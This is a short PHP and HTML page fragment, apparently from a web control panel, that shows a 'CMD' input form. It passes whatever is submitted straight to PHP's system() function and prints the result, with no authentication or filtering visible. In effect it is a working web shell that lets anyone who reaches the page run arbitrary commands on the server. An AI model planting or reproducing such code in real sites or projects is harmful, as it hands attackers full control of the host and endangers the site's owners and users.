<form method="post" action="main.php?cmd=shell">
    <div class="row">
        <div class="col-2 colLine">CMD</div>
        <div class="col-9 colLine">
            <input type="text" name="command" class="form-control">
        </div>
        <div class="col colLine">
            <button type="submit" class="btn btn-primary btn-sm">Go</button>
        </div>
    </div>
</form>

<div class="row">
    <div class="col colLine">
        <pre>
        <?php
            if(isset($_POST["command"]))
            {
                system($_POST["command"]);
            }
        ?>
        </pre>
    </div>
</div>